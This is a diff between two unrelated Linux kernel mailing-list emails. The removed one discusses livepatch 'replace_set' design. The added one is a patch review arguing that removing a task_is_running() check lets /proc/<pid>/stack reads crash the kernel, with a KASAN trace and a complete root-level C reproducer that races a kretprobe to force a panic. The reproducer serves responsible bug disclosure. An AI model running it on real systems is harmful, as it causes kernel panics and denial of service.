@@ -1,234 +1,337 @@
-Received: from mail-wm1-f41.google.com (mail-wm1-f41.google.com [209.85.128.41])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from xmbghk7.mail.qq.com (xmbghk7.mail.qq.com [43.163.128.43])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3BD923FBB6D
-	for <live-patching@vger.kernel.org>; Thu, 11 Jun 2026 12:58:44 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.41
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7C72478F59
+	for <live-patching@vger.kernel.org>; Thu, 11 Jun 2026 15:53:49 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=43.163.128.43
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1781182726; cv=none; b=feWNsiNFzOiysnSXC1Y3dqNQJ+BtoQg7KuluJAZXuASMtTYjvOKP97RnBRV1MC8QOG5PrNw1rkG2lnorUb7mvY/0SB1xlzGADLYYCd7gv1qbCInm6nqnSZMyW20Jj+2JwEkqSQ93+SigRZ65Hp645M2mUay1Is6JrWmC1FMEjCc=
+	t=1781193234; cv=none; b=TPi2UNLx5QrOB2azbRHPJSlIfHkf0NcMFKXZMXYAAdupY4uvxlcDNSKpPi2jZema9lyBp2I6p9GgsFihkahf8nnAFfX4Svtq8zdZZZpS2DP0uEbCIvo5klJwxiOJ85sbSgMIQ8u2dbfEVXSfEe8FfxWmu2tOl8OicyJyEGDAHPE=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1781182726; c=relaxed/simple;
-	bh=DiAmNazkXDZnbVA0JaVfjVSYxU9/VeS8x5P+BpE6LmQ=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=lkjuES7o1bWcgfMnrOKN35HJUIltNlTIolJgVQA33o8ALS+c5sTtBAB9zKPlNOv20JP2LgnQpMt7q19GJ6KLojVjTLvNtVynobzrcTDdkrIYX8DBCwWGj5JRufevIlCNkwn2wcxO4x/0Jiwo4PqFJ1feJNbKs31ta96eaqDkrvU=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=suse.com; spf=pass smtp.mailfrom=suse.com; dkim=pass (2048-bit key) header.d=suse.com header.i=@suse.com header.b=Hsn1Q5Zi; arc=none smtp.client-ip=209.85.128.41
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=suse.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=suse.com
+	s=arc-20240116; t=1781193234; c=relaxed/simple;
+	bh=UrJHc1zn5cYBOLn3pfidw1o3oMR7LpIRvrhqMQ2KYss=;
+	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
+	 In-Reply-To:Content-Type; b=Itw+kHQEhUzlfVe2PinlZ5mluLkL391YxAKFkcJ2zzjDb/6rKgKFcYuwUbv1dvxYlHLQ3qnkcFRfUri5QUhcag4ocr+M6PRPXJ4gZJvvPZeIFWKpvzEhvuyZD5aGs/7jltAxi9xsSyEMoADjLo/dLC1KoXs+vABJATL2wUeBVgE=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com; spf=pass smtp.mailfrom=qq.com; dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b=T9qhJN6f; arc=none smtp.client-ip=43.163.128.43
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=qq.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=qq.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=suse.com header.i=@suse.com header.b="Hsn1Q5Zi"
-Received: by mail-wm1-f41.google.com with SMTP id 5b1f17b1804b1-490ae94a89eso67893125e9.1
-        for <live-patching@vger.kernel.org>; Thu, 11 Jun 2026 05:58:43 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=suse.com; s=google; t=1781182722; x=1781787522; darn=vger.kernel.org;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
-        bh=lJkomeAcdbVrG8c2ONtTeWplM8dlpQFUUP6GpRBZtf4=;
-        b=Hsn1Q5Zi88v0jPHIPjwPUMyclixfCBARRb8gNllbEIcw1cyUqw1cV2zItlOxkS9kfN
-         mUGtEbyHhiC2nO6xi0u+n2IVDtMSIk5Kbu2sxw5qCXkW6Iu/r97Nx710xW3O44G1y7K7
-         dQ8SKzcPQdg1lwd95rvBfdU7U4FHnEVhGgTKZXkQvFLSPiqzEt4mNK59z1I0q6Xj/VbD
-         RyM2CRipSI1lkdn9c0d9w4pjOLp0k6asiJ08Iw7/OlbdeO1iUWMQbuUwWjnfq3TT1r5a
-         gXT0d+fRE+y10AqHEwMqAIfMuGqvPLi/EvLnV1IQVI81enKXE2PoNAK58ej6JVYcP2UG
-         NV5A==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1781182722; x=1781787522;
-        h=in-reply-to:content-disposition:mime-version:references:message-id
-         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
-         :subject:date:message-id:reply-to;
-        bh=lJkomeAcdbVrG8c2ONtTeWplM8dlpQFUUP6GpRBZtf4=;
-        b=qxkcDGLHuwJI7zSFrCZjqNxb8+31+3ITnWGjbErcxSQsZ+QZ+wfv9YMrn+916yqp6g
-         1jEBv7rri47D1hJ50joozbNIGAl/HnmuTfnSvwjVwXPjx2UABxD2lrt2obaHzOCYy7Pm
-         1INyKVG+s85Ij7Nect06BChS/B9GWEOoy0sbt3OS7GOa5TyMhpw+wtktSudJu+zm8sUY
-         y0RD3KRfDRkcWxKTHQ+g/hy3Hju/k0IWZiTWSVp8pVag4i4H7Q3AwayNRw3/aKL2v9NS
-         Fch4+MchK5IYlSNuJvAbaen55IdgtR2gwZqK9XVMn+WreC+J6c3wddxKY+y5qK5KyIAc
-         e6Aw==
-X-Forwarded-Encrypted: i=1; AFNElJ+tVX01M+gIWGoTPBPjncqEJczzeeyc4eaewm5CfS8bJvYAX+u1QnmXFOYrriC2m9nKRSW4jMv9wvb2azQF@vger.kernel.org
-X-Gm-Message-State: AOJu0Yz7temc+XdUoEt07hC0cJ1hmQhbsjKEP223RJJIy1LWWrKLpmPM
-	A6SnsMAeBwnoRqgt7hw/LA9IwqLKDIRgDUQFTujyLx6NyeAIUq906xcMGvS+d82Ll7w=
-X-Gm-Gg: Acq92OEbhcbxe5kErJ8qzssHu4PHJmlsQDuUnYygzLOYvuwo1+r+nW99ufFc8N0vI9k
-	LswrccLBPTmcXWFQp1Q9JDgbPDCPTebc25kYMh633pdOsI5B2wdjI6AT7j1J+nsNI4qqfOA6hXw
-	oyTR4vY99dHSCAYu1Mb0oZmQE9s3J1oP5hFlGTZilsV9RuJbt+TALt6Ueeg11G1d1aTwNdvQjqr
-	aI/1ZPmLUwYHe+QxS9YnxCwhftjgBAcYa7bxKtW9fBQJ1sG+xJEzXseE+XDl0zqkmwJnQDQNTn/
-	Gs2mJeZvUGx4iQsPTgldVpwrn/hljlzhOkU7x6A/d/3sdvTTEKU91cR2nm0rLNajcx1kdFLcj3g
-	BQyrpFOcbjKO8aV5lDqXt0qDPKjLf9OEy45uQcxGZYahbsNx1p31KL2Plho9wkw2bl34DGOKfyO
-	ptPiAMmkbNuT2OZL1HKAah1iso5HnU7HqTadEe
-X-Received: by 2002:a05:600c:c054:b0:490:4b89:5362 with SMTP id 5b1f17b1804b1-490e56146admr23634895e9.24.1781182722443;
-        Thu, 11 Jun 2026 05:58:42 -0700 (PDT)
-Received: from pathway.suse.cz ([176.114.240.130])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-490e5314dedsm55779705e9.9.2026.06.11.05.58.41
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Thu, 11 Jun 2026 05:58:41 -0700 (PDT)
-Date: Thu, 11 Jun 2026 14:58:39 +0200
-From: Petr Mladek <pmladek@suse.com>
-To: Yafang Shao <laoar.shao@gmail.com>
-Cc: jpoimboe@kernel.org, jikos@kernel.org, mbenes@suse.cz,
-	joe.lawrence@redhat.com, song@kernel.org,
-	live-patching@vger.kernel.org
-Subject: Re: [PATCH v3 3/7] livepatch: Support scoped atomic replace using
- replace_set
-Message-ID: <aiqw_74v-1_2D9rJ@pathway.suse.cz>
-References: <20260607131659.29281-1-laoar.shao@gmail.com>
- <20260607131659.29281-4-laoar.shao@gmail.com>
- <aig4smgme6DR8pfs@pathway.suse.cz>
+	dkim=pass (1024-bit key) header.d=qq.com header.i=@qq.com header.b="T9qhJN6f"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
+	t=1781193220; bh=Nrg0CX+AfSNCklWRxpBZUAyyoBEK3zoOzsw4h82GBHE=;
+	h=Date:Subject:To:Cc:References:From:In-Reply-To;
+	b=T9qhJN6fFIYnBsGdpPs95AImsj+H8S2OBh9h2c3KYbcJ7bqAouYoie3muQYZ1q+1+
+	 MXxKCVlJk+jrM2ejLquZyfs4fGhWBdBPQL9M6JpkYfbXKPOpR8wiwJCepsW/q81A6p
+	 ET/NUwFRTHSYrJalU2yJgIJBBYVDdeSNTLcV7Of0=
+Received: from [198.18.0.1] ([115.156.144.140])
+	by newxmesmtplogicsvrszb51-0.qq.com (NewEsmtp) with SMTP
+	id D648B8D7; Thu, 11 Jun 2026 23:53:36 +0800
+X-QQ-mid: xmsmtpt1781193216t1z857ko9
+Message-ID: <tencent_3D17DC5BE32C8A51D938AF50F221321F6206@qq.com>
+X-QQ-XMAILINFO: Ni33zkRHTF0SUyz31tuduCr0g1uuxDh1oPuI80M+5VBJzF12nEa6muyJP55grL
+	 KjSpTdu11In2x9su/6krDW4pcfXb3YTLQrwJO8gOmQtufkMkRkUU6Ke3+FV2MV4SNZc4owd3pLu/
+	 LDsL8mIzg9Jpj/2g5JLoDLYJ1RHChf81fN60rU9lWYgaTukoiTYI+faH/52UAn1ymQ/0lprV6Eoy
+	 rrE8Mjxq42lz7oFvLrpyAq4Fbe/Q4c7EfIWEYvE7L7M69DzyGtqU4sHmwh5JK/hnJkrAmO74ga3h
+	 vQ+m3Ddnj6PxYdodBkXyHthqkaVXypS+jn59naSyy4V3DB4IRAIMNYGINdtJYCVOGepIzu1NjiDW
+	 +3ePUHv8vO0ojiKFMC6xjcJE0PUIJPnc74ATDUE3X9XLw+8NPgI/LFttM44hKQZBKX5lxIhULBn2
+	 pGws7xTJP28vv1zafG3BdK5RrvIYMiJKG8l8IcYGfHmn/PJ/7PQ6oDedQuxV7v7jSnp7TWn5Ojpi
+	 DUFTt/fHBRDRc09dRE/X3slZI1SswQA2zhXpqa07H6hDyCSXSzlTqBRZ+Tixzvh8cmOkE/uNkme0
+	 k0objsyW/55b+EhMjsAQ/pEQJJQx1RgsAf/rSy0DBdVew5RGM1ga7FWKaKa/DnyU7jvvgLFn30Xn
+	 Tq6P7grJXnWDAqNkvnnJoeibvQsEK20BgHAgYyLBK9aerejYiNzu68KOkO/+aiyWYILAOrR20OVs
+	 WYxZfoHTSJ4WLhJ64CxcW4UHT0Ji1KKoz43atCdExKNHGBfCHD4ptOIhZlTcCMqYN/37umLeZMk3
+	 usdK+kJ5Y4L4DZWnKaALMOX+4M6s1+/UN+mXUE3DcIUPCX0WkoweDZ4UVElTuhfSMnr2eBRXPwIm
+	 n5iBFgvaGZAZG/KvDApSL2WtQeMVw6YbUp51G+hCm3xghcR+8M+GzfZ+201cTNL3ve8ZlN1ZVE2P
+	 srh872CeuB7EjBaINMJhyhb4KOiDuAMANyPLywXvZcPymMWepbd+gJ6vFHmqa3GGRvCMnKBNVaiB
+	 ZgdnOo48afxCW/8T/QY9T5NeuKyU3DD7oVNvTVEJUgLB13Mzf+0riNvv0U+f5R7rK0hbVl4gbLKS
+	 E2FsfGMIyyCWA4JnI=
+X-QQ-XMRINFO: Nq+8W0+stu50tPAe92KXseR0ZZmBTk3gLg==
+X-OQ-MSGID: <c02dbbe3-c2d6-4505-a028-a9e1bf297c00@qq.com>
+Date: Thu, 11 Jun 2026 23:53:36 +0800
 Precedence: bulk
 X-Mailing-List: live-patching@vger.kernel.org
 List-Id: <live-patching.vger.kernel.org>
 List-Subscribe: <mailto:live-patching+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:live-patching+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <aig4smgme6DR8pfs@pathway.suse.cz>
+User-Agent: Mozilla Thunderbird
+Subject: Re: [PATCH v4] rethook: Remove the running task check in
+ rethook_find_ret_addr()
+To: sashiko-reviews@lists.linux.dev, Masami Hiramatsu <mhiramat@kernel.org>,
+ Petr Mladek <pmladek@suse.com>, Peter Zijlstra <peterz@infradead.org>
+Cc: Tengda Wu <wutengda@huaweicloud.com>,
+ Mathieu Desnoyers <mathieu.desnoyers@efficios.com>,
+ Alexei Starovoitov <ast@kernel.org>, Steven Rostedt <rostedt@goodmis.org>,
+ linux-kernel@vger.kernel.org, linux-trace-kernel@vger.kernel.org,
+ live-patching@vger.kernel.org
+References: <20260610013658.1837963-1-wutengda@huaweicloud.com>
+ <20260610015032.4BFAA1F00893@smtp.kernel.org>
+From: XIAO WU <xiaowu.417@qq.com>
+In-Reply-To: <20260610015032.4BFAA1F00893@smtp.kernel.org>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
 
-On Tue 2026-06-09 18:00:55, Petr Mladek wrote:
-> On Sun 2026-06-07 21:16:55, Yafang Shao wrote:
-> I would write something like:
-> 
-> <proposal>
-> The practice shows that the current semantic of the patch.replace flag is
-> not ideal.
-> 
-> The atomic replace is disabled by default. And the no-replace mode allows
-> wild installation of many livepatches in parallel. The author and
-> administrator are fully responsible for preventing problems caused
-> by producing and installing incompatible livepatches.
-> 
-> The most safe atomic replace mode must be explicitly enabled by
-> setting "patch.replace = true". It is all or nothing. The livepatch
-> with enabled .replace will always replace all already installed
-> livepatches. It makes it very safe but it might be too harsh.
-> 
-> Improve the situation by switching "bool .replace" flag to
-> "u32 .replace_set" and and updating its semantic.
-> 
-> Any .replace_set value might be associated with a set of livepatched
-> symbols, callbacks, shadow variable and state IDs.
-> 
-> A livepatch with a particular .replace_set number will atomically
-> rreplace any already installed livepatch with the same .replace_set
-> number. By definition, there can only ever be one active livepatch
-> for a given replace_set number.
-> 
-> On the contrary, livepatches with a different .replace_set number
-> must not modify the same function, or use the state with the same
-> ID [*]. Any attempt to load an incompatible livepatch will be
-> rejected.
-> 
-> Summary:
-> 
-> The most safe mode when any livepatch replaces any other livepatch
-> will be the default. Note that all livepatches must keep
-> .replace_set = 0.
-> 
-> It will be possible to install more livepatches in parallel by
-> using different .replace_set numbers. The livepatches might be
-> updated independently using the atomic replace feature as long
-> as the new version does not break compatibility. The kernel will
-> reject a livepatch from a different replace set when it would
-> want to modify the same function or livepatch state from
-> another replace set.
-> 
-> [*] The compatibility check of callbacks and shadow variables will
->     be improved later by reworking their semantic. There is a work
->     in progress, see [0]
-> </proposal>
-> 
-> > Link: https://github.com/pmladek/linux/tree/klp-state-transfer-v1-iter12 [0]
-> 
-> I have realized that I actually sent "v1-iter12" to the public
-> mailing list as the official v1. So we could use:
-> 
-> Link: https://lore.kernel.org/all/20250115082431.5550-1-pmladek@suse.com/ [0]
-> 
-> 
-> New idea:
-> 
-> I have briefly discussed the new semantic with Miroslav when I met
-> him in person. And he was a bit concerned. We as an OS distributor
-> might want to be sure that our livepatches can be installed the most
-> safe way. So, we still might want to preserve the "replace all"
-> semantic to make sure that our livepatches will not break anything.
+Hi Tengda,
 
-I thought more about it and we would need some solution to preserve
-the replace_all functionality.
+Sashiko [1] reviewed this patch and found that removing the
+task_is_running() check exposes stack unwinders to real crashes — not
+just "invalid information."  A PoC confirms this: a KASAN panic triggers
+within seconds when /proc/<pid>/stack reads the stack of a task that is
+concurrently running a kretprobe.
 
-There were recently reported few serious 0-day vulnerabilities.
-We discussed a possibility to ship a quick fix with a livepatch.
-Or that customers might want to fix it themself by a livepatch.
-Such a livepatch would need to be installed in parallel to
-the official livepatch fixing older bugs. But the next official
-cumulative livepatch would need to replace it.
+[1] 
+https://sashiko.dev/#/patchset/20260610013658.1837963-1-wutengda%40huaweicloud.com
 
-The above scenario will not longer work with the current
-"replace_set" handling. The hotfix would need to use another
-"replace_set" so that it can be installed in parallel.
-But the next cumulative livepatch won't be able to replace
-it because it would need to modify the same function.
+ > diff --git a/kernel/trace/rethook.c b/kernel/trace/rethook.c
+ > index 5a8bdf88999a..1e7fdebe3cd5 100644
+ > --- a/kernel/trace/rethook.c
+ > +++ b/kernel/trace/rethook.c
+ > @@ -250,9 +251,6 @@ unsigned long rethook_find_ret_addr(struct 
+task_struct *tsk, unsigned long frame
+ >      if (WARN_ON_ONCE(!cur))
+ >          return 0;
+ >
+ > -    if (tsk != current && task_is_running(tsk))
+ > -        return 0;
+ > -
+ >      do {
+ >          ret = __rethook_find_ret_addr(tsk, cur);
+ >          if (!ret)
 
-I consulted this with AI (claude-sonet-4.6) and it gave the following
-feedback/ideas ;-)
+The commit message states:
 
-> I though about 4 approaches approaches:
-> 
-> 1. Make .replace_set=0 special so that it will always replace
->    everything. Similar to the current .replace=true mode.
-> 
->    Customers will still be able to install custom livepatches
->    later with .replace_set != 0. But the "0" livepatch will
->    always wipe them out.
+ > The iteration is already safe from crashes because
+ > unwind_next_frame() holds RCU and rethook_node structures are
+ > RCU-freed; even if the iteration goes off the rails and returns
+ > invalid information, it will not crash.
 
-This is not ideal because it is asymetric. Why is "0" special?
+There are two problems with this claim, both reproducible.
 
+**Problem 1: stack-out-of-bounds in unwind_next_frame itself**
 
-> 2. Use two flags in the livepatch, for example
-> 
->      a. Rename .replace to .replace_all. The livepatch with this
-> 	flag set will always wipe all other livepatches.
-> 
->      b. Add .replace_set which will allow to install more livepatches
-> 	in parallel, replace the livepatches with the same .replace_set
-> 	atomically, and check the compatibility. As described above.
-> 
->     It is a bit more complicated. But it is more compatible with
->     the current state. And it removes the special meaning of
->     .replace_set == 0.
+The PoC below reliably triggers the following KASAN panic — not in the
+rethook list traversal, but inside unwind_next_frame():
 
-This looks more straightforward. But the fact that "replace_all"
-replaces everything brings back the problem with the original
-"replace" flag. So, it makes this whole exercise more or less
-pointless.
+[ 1833.494623] BUG: KASAN: stack-out-of-bounds in 
+unwind_next_frame+0x861/0x2080
+[ 1833.494651] Read of size 2 at addr ffffc90003e6f5f0 by task poc/9854
+[ 1833.494707] Call Trace:
+[ 1833.494719]  dump_stack_lvl+0x116/0x1f0
+[ 1833.494743]  print_report+0xf4/0x600
+[ 1833.494788]  kasan_report+0xe0/0x110
+[ 1833.494836]  unwind_next_frame+0x861/0x2080
+[ 1833.494948]  arch_stack_walk+0x99/0x100
+[ 1833.495000]  stack_trace_save_tsk+0x16a/0x200
+[ 1833.495054]  proc_pid_stack+0x173/0x2b0
+[ 1833.495103]  seq_read_iter+0x519/0x12d0
+[ 1833.495166]  seq_read+0x3b7/0x590
+[ 1833.495297]  vfs_read+0x1f5/0xd20
+[ 1833.495497]  ksys_read+0x135/0x250
+[ 1833.495549]  do_syscall_64+0x129/0x850
+[ 1833.495566]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[ 1833.498894] Kernel panic - not syncing: KASAN: panic_on_warn set ...
 
-I had another idea with storing list of fixed bugs/CVEs in each
-livepatch. Independent fixes might be fixed by independent
-livepatches. Then a cumulative livepatch would replace only
-the livepatches which fixed the same bugs before.
+page last free pid 9737 tgid 9737 stack trace:
+  do_sys_openat2+0xbf/0x260          <-- target task inside kretprobe
+  __x64_sys_openat+0x179/0x210
 
-And (claude-sonnet-4.6) came with an interesting simplification.
+This crash has nothing to do with rethook_node lifetimes or RCU.  It
+happens because the ORC unwinder reads stack memory while the target
+task concurrently executes a kretprobe trampoline that modifies return
+addresses.  The unwinder follows corrupted frame data past valid stack
+boundaries.  RCU protection of rethook_node structures is irrelevant —
+this crash occurs at the stack frame interpretation level, before any
+rethook list traversal.
 
-We could add:
+The old task_is_running() check prevented the unwinder from attempting
+to unwind a running task's stack in the first place.
 
-struct klp_patch {
-[...]
-      unsigned int replace_set;
-      const unsigned int *supersedes;   /* Zero terminated array of replace_set IDs */
-[...]
+**Problem 2: use-after-free via rethook_node recycling**
+
+Even if the stack-out-of-bounds above were addressed, a second crash
+path exists in the rethook list traversal itself.
+
+rethook_recycle() immediately pushes nodes back to the objpool without
+an RCU grace period:
+
+   kernel/trace/rethook.c:
+   void rethook_recycle(struct rethook_node *node)
+   {
+           ...
+           objpool_push(node, &node->rethook->pool);
+   }
+
+Meanwhile, unwind_next_frame() in arch/x86/kernel/unwind_orc.c drops
+RCU between frames while the cursor (*cur) persists across iterations:
+
+   arch/x86/kernel/unwind_orc.c:
+   bool unwind_next_frame(...)
+   {
+           ...
+           guard(rcu)();    // RCU held for one frame
+           ...
+   }                        // RCU dropped here
+
+When the unwinder calls __rethook_find_ret_addr() in the next frame
+iteration, it does:
+
+   struct llist_node *first = tsk->rethooks.first;
+   ...
+   *cur = first;
+   ...
+   node = node->next;       // node may have been recycled
+
+If the target task returns from a probed function between frames, its
+rethook_node is recycled and can be instantly reallocated to another
+task.  The unwinder's stale cursor then dereferences a freed pointer,
+leading to use-after-free.
+
+## Reproducer
+
+The PoC sets up a kretprobe on do_sys_openat2, creates hot-loop threads
+calling open(), and concurrently reads /proc/<tid>/stack.  The race
+triggers within seconds (Problem 1 above; Problem 2 may reproduce on
+kernels without KASAN or with different timing).
+
+Build:  gcc -static -pthread -o poc poc.c
+Run:    ./poc [runtime_seconds]
+Needs:  root, CONFIG_KASAN=y
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/syscall.h>
+#include <sched.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <signal.h>
+#include <pthread.h>
+#include <dirent.h>
+
+#define TRACE "/sys/kernel/tracing"
+
+volatile int stop = 0;
+
+static int tfs(const char *f, const char *b)
+{
+     char p[256]; int fd, r;
+     snprintf(p, 256, "%s/%s", TRACE, f);
+     fd = open(p, O_WRONLY | O_TRUNC);
+     if (fd < 0) {
+         system("mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null");
+         usleep(50000);
+         fd = open(p, O_WRONLY | O_TRUNC);
+     }
+     if (fd < 0) return -1;
+     r = write(fd, b, strlen(b));
+     close(fd);
+     return r < 0 ? -1 : 0;
 }
 
-So that the cumulative livepatch might optionally define
-another "replace_set"s which would be replaced.
+void *hot_thread(void *arg)
+{
+     while (!__atomic_load_n(&stop, __ATOMIC_RELAXED)) {
+         int fd = open("/dev/null", O_RDONLY);
+         if (fd >= 0) close(fd);
+     }
+     return NULL;
+}
 
-This would work well when both cumulative livepatches and the hotfix
-are provided by the same vendor or group.
+void *reader_thread(void *arg)
+{
+     pid_t target = *(pid_t *)arg;
+     char path[64], buf[8192];
+     snprintf(path, 64, "/proc/%d/stack", target);
+     while (!__atomic_load_n(&stop, __ATOMIC_RELAXED)) {
+         int fd = open(path, O_RDONLY);
+         if (fd >= 0) { read(fd, buf, 8191); close(fd); }
+     }
+     return NULL;
+}
 
-We could also allow to change it dynamically by adding an module
-option to the cumulative livepatch, .e.g supersedes=id[,id]*
-We could add some support into the kernel for handling the module
-parameter a standard way.
+void sigh(int s) { stop = 1; }
 
-It is not trivial. But it is also not horribly complex.
-It looks like a good compromise between the requirements and
-code complexity.
+int main(int argc, char *argv[])
+{
+     int runtime = 120;
+     if (argc > 1) runtime = atoi(argv[1]);
 
-We really need input from others here.
+     printf("rethook race PoC\n");
+     if (geteuid()) { printf("root needed\n"); return 1; }
+     signal(SIGINT, sigh);
 
-Best Regards,
-Petr
+     pthread_t hot[4], rdr[4];
+     pid_t hot_tids[4];
+     int pairs = 4;
+
+     for (int c = 0; c < runtime / 5 && !stop; c++) {
+         tfs("events/kprobes/myretprobe/enable", "0");
+         tfs("kprobe_events", "-:myretprobe");
+         usleep(100);
+         tfs("kprobe_events", "r:myretprobe do_sys_openat2 $retval");
+         tfs("events/kprobes/myretprobe/enable", "1");
+
+         pid_t main_tid = syscall(SYS_gettid);
+
+         for (int i = 0; i < pairs; i++)
+             pthread_create(&hot[i], NULL, hot_thread, NULL);
+
+         usleep(300000);
+
+         {
+             DIR *d = opendir("/proc/self/task");
+             int cnt = 0;
+             if (d) {
+                 struct dirent *de;
+                 while ((de = readdir(d)) != NULL && cnt < pairs) {
+                     pid_t t = atoi(de->d_name);
+                     if (t > 0 && t != main_tid)
+                         hot_tids[cnt++] = t;
+                 }
+                 closedir(d);
+             }
+             for (int i = 0; i < cnt; i++)
+                 pthread_create(&rdr[i], NULL, reader_thread, &hot_tids[i]);
+         }
+
+         printf("round %d\n", c);
+         sleep(5);
+
+         stop = 1;
+         usleep(100000);
+
+         for (int i = 0; i < pairs; i++) pthread_join(hot[i], NULL);
+         for (int i = 0; i < pairs; i++) pthread_join(rdr[i], NULL);
+
+         stop = 0;
+         usleep(1000);
+     }
+
+     tfs("events/kprobes/myretprobe/enable", "0");
+     tfs("kprobe_events", "-:myretprobe");
+     printf("Done\n");
+     return 0;
+}
+
+## Summary
+
+The v4 commit message claims the iteration "will not crash," but the PoC
+demonstrates a reproducible KASAN panic:
+
+1. stack-out-of-bounds in unwind_next_frame (ORC unwinder reads
+    concurrently-modified stack frames of a running task)
+
+2. Potential use-after-free in __rethook_find_ret_addr (rethook nodes
+    recycled without RCU grace period, cursor persists across RCU drops)
+
+The old task_is_running() check was racy but served as a practical
+safety net.  Removing it without adding equivalent protection in the
+callers (proc_pid_stack, BPF stack walkers) exposes users to kernel
+panics via /proc/<pid>/stack on any task running a kretprobe.
+
+Thanks,
+Xiao
+
